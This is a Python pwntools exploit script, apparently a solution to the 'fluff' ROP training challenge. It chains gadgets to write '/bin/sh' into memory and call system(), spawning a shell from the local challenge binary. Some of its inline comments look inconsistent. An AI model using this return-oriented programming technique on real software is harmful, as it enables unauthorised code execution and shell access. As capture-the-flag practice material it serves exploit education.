#!/usr/bin/python

from pwn import *

s = process('./fluff')
s.clean()

bss = 0x601060
system = 0x4005e0

# rp-lin-x64 --rop=8 -f fluff --unique
# 0x0040084e: mov qword [r10], r11 ; pop r13 ; pop r12 ; xor byte [r10], r12L ; ret
mov_qword_ptr_r10_r11 = 0x0040084e

# 0x00400822: xor r11, r11 ; pop r14 ; mov edi, 0x00601050 ; ret
xor_r11_r11 = 0x00400822

# 0x0040082f: xor r11, r12 ; pop r12 ; mov r13d, 0x00604060 ; ret
xor_r11_r12 = 0x0040082f

# 0x00400840: xchg r11, r10 ; pop r15 ; mov r11d, 0x00602050 ; ret 
xchg_r11_r10 = 0x00400840

# 0x00400855: xor byte [r10], r12L ; ret  
xor_ptr_r10_r12L = 0x00400855

# 0x004008c3: pop rdi ; ret
pop_rdi = 0x004008c3

# 0x00400832: pop r12 ; mov r13d, 0x00604060 ; ret
pop_r12 = 0x00400832


write_bin_sh_to_bss = p64(xor_r11_r11)                # r11 = 0
write_bin_sh_to_bss += 'BBBBBBBB'               
write_bin_sh_to_bss += p64(pop_r12)                   # r12 = bss + 8
write_bin_sh_to_bss += p64(bss + 8)
write_bin_sh_to_bss += p64(xor_r11_r12)               # r11 = bss + 8
write_bin_sh_to_bss += 'BBBBBBBB'
write_bin_sh_to_bss += p64(xchg_r11_r10)              # r11 = 0; r10 = bss + 8
write_bin_sh_to_bss += 'BBBBBBBB'
write_bin_sh_to_bss += p64(pop_r12)                   # r12 = '\x3d\x42\x09n/sh\x00' ('/bin/sh\x00' ^ 0x602050; x xor 50 = 6d; x = 0x3d)
write_bin_sh_to_bss += '\x3d\x42\x09n/sh\x00'
write_bin_sh_to_bss += p64(xor_r11_r12)               # r11 = '/bin/sh\x00'
write_bin_sh_to_bss += 'BBBBBBBB'
write_bin_sh_to_bss += p64(mov_qword_ptr_r10_r11)     # r10 = bss + 8 => [bss + 8] = '/bin/sh\x00'
write_bin_sh_to_bss += 'BBBBBBBB'
write_bin_sh_to_bss += 'BBBBBBBB'


payload = 'A' * 40
payload += write_bin_sh_to_bss
payload += p64(pop_rdi)
payload += p64(bss + 8)
payload += p64(system)

'''
context.terminal = ["terminator", "-e"]
gdb.attach(s,
"""
b * main
b * pwnme+81
""")
'''

s.sendline(payload)
s.interactive()




















